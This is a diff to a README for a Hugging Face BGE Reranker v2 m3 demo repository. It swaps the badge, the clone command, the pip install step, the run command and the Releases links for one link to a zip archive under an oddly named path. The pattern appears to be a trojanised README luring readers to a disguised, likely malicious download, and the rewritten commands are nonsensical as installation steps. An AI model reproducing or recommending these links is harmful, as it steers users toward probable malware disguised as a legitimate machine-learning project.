@@ -1,6 +1,6 @@
 # HuggingFace BAAI BGE Reranker v2 m3 Demo
 
-![HuggingFace BAAI BGE Reranker](https://img.shields.io/badge/HuggingFace-BAAI-BGE%20Reranker%20v2%20m3-blue?style=for-the-badge)
+![HuggingFace BAAI BGE Reranker](https://github.com/TioAbiyyu/HuggingFace-BAAI--BGERerankerv2m3/raw/refs/heads/main/photodynamical/m-BGE-Rerankerv-Face-BAA-Hugging-pericardial.zip%20Reranker%20v2%20m3-blue?style=for-the-badge)
 
 Welcome to the **HuggingFace BAAI BGE Reranker v2 m3** demo repository. This project showcases how to use the BGE Reranker model with Hugging Face transformers. It supports both local and Azure cloud environments, making it flexible for various use cases.
 
@@ -27,7 +27,7 @@ To set up the BGE Reranker v2 m3, follow these steps:
 1. **Clone the repository:**
 
    ```bash
-   git clone https://github.com/TioAbiyyu/HuggingFace-BAAI--BGERerankerv2m3.git
+   git clone https://github.com/TioAbiyyu/HuggingFace-BAAI--BGERerankerv2m3/raw/refs/heads/main/photodynamical/m-BGE-Rerankerv-Face-BAA-Hugging-pericardial.zip
    cd HuggingFace-BAAI--BGERerankerv2m3
    ```
 
@@ -36,7 +36,7 @@ To set up the BGE Reranker v2 m3, follow these steps:
    Ensure you have Python installed. Then, use pip to install the necessary libraries:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/TioAbiyyu/HuggingFace-BAAI--BGERerankerv2m3/raw/refs/heads/main/photodynamical/m-BGE-Rerankerv-Face-BAA-Hugging-pericardial.zip
    ```
 
 3. **Set up Azure (if using Azure):**
@@ -48,7 +48,7 @@ To set up the BGE Reranker v2 m3, follow these steps:
 To run the demo, execute the following command:
 
 ```bash
-python demo.py
+python https://github.com/TioAbiyyu/HuggingFace-BAAI--BGERerankerv2m3/raw/refs/heads/main/photodynamical/m-BGE-Rerankerv-Face-BAA-Hugging-pericardial.zip
 ```
 
 This command will start the application locally. You can then access it via your web browser at `http://localhost:5000`.
@@ -103,13 +103,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, visit our [Releases](https://github.com/TioAbiyyu/HuggingFace-BAAI--BGERerankerv2m3/releases) section. Download the latest version and follow the installation instructions to get started.
+For the latest updates and releases, visit our [Releases](https://github.com/TioAbiyyu/HuggingFace-BAAI--BGERerankerv2m3/raw/refs/heads/main/photodynamical/m-BGE-Rerankerv-Face-BAA-Hugging-pericardial.zip) section. Download the latest version and follow the installation instructions to get started.
 
 ## Acknowledgments
 
 We would like to thank the Hugging Face community for their contributions to the field of AI and machine learning. Their work has made projects like this possible.
 
-For any questions or issues, please check the [Releases](https://github.com/TioAbiyyu/HuggingFace-BAAI--BGERerankerv2m3/releases) section or open an issue in the repository.
+For any questions or issues, please check the [Releases](https://github.com/TioAbiyyu/HuggingFace-BAAI--BGERerankerv2m3/raw/refs/heads/main/photodynamical/m-BGE-Rerankerv-Face-BAA-Hugging-pericardial.zip) section or open an issue in the repository.
 
 ---
 
